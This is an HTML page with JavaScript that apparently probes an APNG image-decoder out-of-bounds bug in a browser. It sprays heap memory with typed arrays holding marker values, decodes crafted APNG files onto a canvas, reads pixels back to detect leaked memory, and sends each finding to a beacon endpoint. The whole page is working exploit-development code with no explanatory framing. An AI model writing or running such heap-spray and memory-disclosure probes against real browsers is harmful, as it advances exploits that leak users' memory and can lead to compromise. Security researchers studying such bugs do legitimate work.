<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>V971B</title></head>
<body><pre id="out">V971B — APNG 321753 OOB controllability: targeted variable slots + typed (U32/F64) marker spray (B)</pre>
<script>
'use strict';
var O=document.getElementById('out');
var RUN='r'+Date.now().toString(36)+Math.random().toString(36).slice(2,6);
function say(s){O.textContent+='\n'+s;}
function bk(tag,body){try{new Image().src='/beacon/V971B-'+tag+'?d='+encodeURIComponent(String(body==null?'':body).slice(0,700))+'&run='+encodeURIComponent(RUN)+'&t='+Date.now()+'&s=1';}catch(e){}}
window.onerror=function(msg,src,line){ bk('ERR','onerror:'+String(msg)+'@'+line); return false; };
function hx(n){ var s=(n>>>0).toString(16); while(s.length<8) s='0'+s; return s; }
function hx2(n){ var s=(n&255).toString(16); return s.length<2?'0'+s:s; }
function loadImg(src,n){ return new Promise(function(res,rej){ var im=new Image(); im.onload=function(){res(im)}; im.onerror=function(){rej(new Error('load-fail:'+src))}; im.src=src+'?cb='+Date.now()+'_'+n+'_'+Math.random(); }); }

var MARK32=[0x41414141,0x12345678,0xDEADBEEF,0xCAFEBABE];
var MARK32HEX={'41414141':1,'12345678':1,'deadbeef':1,'cafebabe':1};
var keep=[];
function spray(round){
  // typed-array spray (Uint32Array/Float64Array) + AB/DV, varied sizes, keep alive
  var sizes=[64,128,256,512,1024,2048,4096,8192,16384, 96,192,384,768,1536,3072,6144];
  var u32c=0,f64c=0,abc=0;
  for(var si=0;si<sizes.length;si++){
    var sz=sizes[si];
    for(var k=0;k<50;k++){
      var n32=Math.max(1,(sz/4)|0);
      var u=new Uint32Array(n32);
      var m=MARK32[(round+si+k)%MARK32.length];
      for(var j=0;j<u.length;j++) u[j]=m ^ (j*0x01010101);
      u[0]=m; if(u.length>1) u[1]=MARK32[(round+si+k+1)%MARK32.length];
      keep.push(u); u32c++;
    }
  }
  for(var fi=0;fi<sizes.length;fi++){
    var nf=Math.max(1,(sizes[fi]/8)|0);
    for(var k=0;k<30;k++){
      var f=new Float64Array(nf);
      // store recognizable bit patterns via Uint32 view
      var uv=new Uint32Array(f.buffer);
      var m=MARK32[(round+fi+k)%MARK32.length];
      for(var j=0;j<uv.length;j++) uv[j]=m;
      keep.push(f); keep.push(uv); f64c++;
    }
  }
  for(var i=0;i<80;i++){
    var ab=new ArrayBuffer(4096); var dv=new DataView(ab);
    var m=MARK32[(round+i)%MARK32.length];
    for(var p=0;p+4<=4096;p+=4){ dv.setUint32(p, (p===0||p===4)?m:0x41414141, true); }
    keep.push({ab:ab,dv:dv}); abc++;
  }
  bk('SPRAY',round+'|u32='+u32c+'|f64='+f64c+'|abdv='+abc+'|keep='+keep.length);
}

var baseline={};
function slotKey(name,y,x){ return name+'|y'+y+'|x'+x; }

function scan942(name,src,pass){
  return loadImg(src,pass).then(function(im){
    var c=document.createElement('canvas'); c.width=64; c.height=64;
    var ctx=c.getContext('2d'); ctx.clearRect(0,0,64,64); ctx.drawImage(im,0,0);
    var d=ctx.getImageData(0,0,64,64).data;
    var rows=[0,1,2,15,16], xs=[14,15,16,17,18,19,20];
    var markerHits=0;
    for(var ri=0;ri<rows.length;ri++){
      var y=rows[ri], parts=[];
      for(var xi=0;xi<xs.length;xi++){
        var x=xs[xi]; var i=(y*64+x)*4;
        var v=hx2(d[i])+hx2(d[i+1])+hx2(d[i+2])+hx2(d[i+3]);
        parts.push(x+'='+v);
        var k=slotKey(name,y,x);
        var isMark = MARK32HEX[v]?1:0;
        if(isMark) markerHits++;
        if(pass==='base'){ baseline[k]=v; }
        // track key variable candidate x=16 and neighbors
        if(x===16 || (pass!=='base' && baseline[k] && baseline[k]!==v) || isMark){
          var changed=(pass!=='base' && baseline[k]) ? (baseline[k]!==v?1:0) : -1;
          bk('SLOT',name+'|'+pass+'|y'+y+'|x'+x+'|v='+v+'|chg='+changed+'|mark='+isMark+(baseline[k]?'|base='+baseline[k]:''));
        }
      }
      bk('R',name+'|'+pass+'|y'+y+'|'+parts.join(' '));
    }
    bk('W',name+'|'+pass+'|markerHits='+markerHits);
    say('W '+name+' '+pass+' markerHits='+markerHits);
  }).catch(function(e){ bk('T-ERR',name+'|'+pass+'|'+String(e&&e.message||e).slice(0,140)); });
}

function scan946(name,src,fullW,fullH,frW,pass){
  return loadImg(src,pass).then(function(im){
    var c=document.createElement('canvas'); c.width=fullW; c.height=fullH;
    var ctx=c.getContext('2d'); ctx.clearRect(0,0,fullW,fullH); ctx.drawImage(im,0,0);
    var d=ctx.getImageData(0,0,fullW,fullH).data;
    var rows=[0,1,2], x0=Math.max(0,frW), x1=Math.min(fullW-2,frW+8);
    var markerHits=0;
    for(var ri=0;ri<rows.length;ri++){
      var y=rows[ri], parts=[];
      for(var x=x0;x<=x1;x+=2){
        var i0=(y*fullW+x)*4, i1=(y*fullW+x+1)*4;
        var lo=hx2(d[i0])+hx2(d[i0+1])+hx2(d[i0+2])+hx2(d[i0+3]);
        var hi=hx2(d[i1])+hx2(d[i1+1])+hx2(d[i1+2])+hx2(d[i1+3]);
        var q=lo+hi;
        var isMark=(MARK32HEX[lo]||MARK32HEX[hi])?1:0;
        if(isMark) markerHits++;
        var k=slotKey(name,y,x);
        if(pass==='base') baseline[k]=q;
        // variable heuristic slots (known x=18 area in f128_fr16) or changed/marker
        var isCand=(x>=frW+2);
        if(isCand || (pass!=='base' && baseline[k] && baseline[k]!==q) || isMark){
          var changed=(pass!=='base' && baseline[k]) ? (baseline[k]!==q?1:0) : -1;
          bk('SLOT',name+'|'+pass+'|y'+y+'|x'+x+'|q='+q+'|chg='+changed+'|mark='+isMark+(baseline[k]?'|base='+baseline[k]:''));
        }
        parts.push(x+(isMark?'!':'')+'='+q);
      }
      bk('Q',name+'|'+pass+'|y'+y+'|'+parts.join(' '));
    }
    bk('W',name+'|'+pass+'|markerHits='+markerHits);
    say('W '+name+' '+pass+' markerHits='+markerHits);
  }).catch(function(e){ bk('T-ERR',name+'|'+pass+'|'+String(e&&e.message||e).slice(0,140)); });
}

(async function(){
  bk('BOOT','V971B controllability recheck: baseline -> typed U32/F64+ABDV marker spray (41414141,12345678,DEADBEEF,CAFEBABE) -> rescan; targets v940b_off0 + v946b_*; run='+RUN);
  bk('BASE-PRE','start');
  await scan942('off0','v940b_off0.apng','base');
  await scan946('f128_fr16','v946b_f128_fr16.apng',128,64,16,'base');
  await scan946('f64_fr16','v946b_f64_fr16.apng',64,64,16,'base');
  await scan946('f64_fr32','v946b_f64_fr32.apng',64,64,32,'base');
  bk('BASE-DONE','baseline captured');

  bk('SPRAY1-PRE','typed spray round 1');
  spray(1);
  await scan942('off0','v940b_off0.apng','spr1');
  await scan946('f128_fr16','v946b_f128_fr16.apng',128,64,16,'spr1');
  await scan946('f64_fr16','v946b_f64_fr16.apng',64,64,16,'spr1');
  await scan946('f64_fr32','v946b_f64_fr32.apng',64,64,32,'spr1');
  bk('SPRAY1-DONE','rescan 1 done');

  bk('SPRAY2-PRE','typed spray round 2');
  spray(2);
  await scan942('off0','v940b_off0.apng','spr2');
  await scan946('f128_fr16','v946b_f128_fr16.apng',128,64,16,'spr2');
  await scan946('f64_fr16','v946b_f64_fr16.apng',64,64,16,'spr2');
  await scan946('f64_fr32','v946b_f64_fr32.apng',64,64,32,'spr2');

  bk('DONE','complete; markerHits>0 OR slot chg with marker => controllability signal. else reinforces uncontrollable/read-only-disclosure.');
  say('done run='+RUN+' keep='+keep.length);
})();
</script>
</body></html>
